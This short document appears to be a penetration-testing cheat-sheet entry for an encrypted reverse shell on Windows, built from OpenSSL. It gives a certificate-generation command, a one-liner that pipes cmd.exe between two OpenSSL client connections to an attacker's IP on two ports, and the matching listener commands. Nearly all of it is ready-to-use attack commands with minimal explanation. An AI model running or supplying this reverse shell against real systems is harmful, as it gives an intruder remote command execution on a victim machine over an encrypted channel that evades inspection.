This reverse shell is a bit different. It will connect the input of cmd on the server listening at IP on Port_1 and the output onto the srever listening at IP on Port_2. Means listening on two ports on the listener as well.

#Generate certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

#Spawn Reverse Shell
openssl s_client -quiet -connect <IP>:<PORT> | cmd.exe | openssl s_client -quiet -connect <IP>:<PORT_2>

#Listen
openssl s_server -quiet -key <KEY> -cert <CERT> -port <PORT_1> &
openssl s_server -quiet -key <KEY> -cert <CERT> -port <PORT_2> &
